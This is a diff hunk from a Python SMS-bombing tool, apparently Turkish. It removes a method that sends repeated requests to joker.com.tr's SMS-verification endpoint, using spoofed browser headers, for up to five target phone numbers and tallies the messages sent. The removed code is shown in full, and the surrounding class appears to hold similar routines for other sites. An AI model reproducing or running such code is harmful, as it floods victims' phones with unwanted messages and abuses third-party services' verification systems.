@@ -1204,34 +1204,7 @@ class SendSms():
                 continue
             
     
-    #joker.com.tr
-    def Joker(self):
-            
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-        bos_olmayan = len([x for x in liste if x != "bos"])
-        uygulanan_nolar = 0
-        for numara in liste:
-            if numara != "bos":
-                try:
-                    url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
-                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
-                    data = {"phone": numara}
-                    r = requests.post(url, headers=headers, data=data)
-                    if (r.json()["success"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> joker.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-                        self.adet += 1
-                        self.toplam_sms += 1
-                    else:
-                        raise
-                except:
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> joker.com.tr "+numara)
-                uygulanan_nolar += 1
-                if uygulanan_nolar == bos_olmayan:
-                    break
-            else:
-                continue
-
-
+    
     #e-bebek.com
     def Ebebek(self):
             
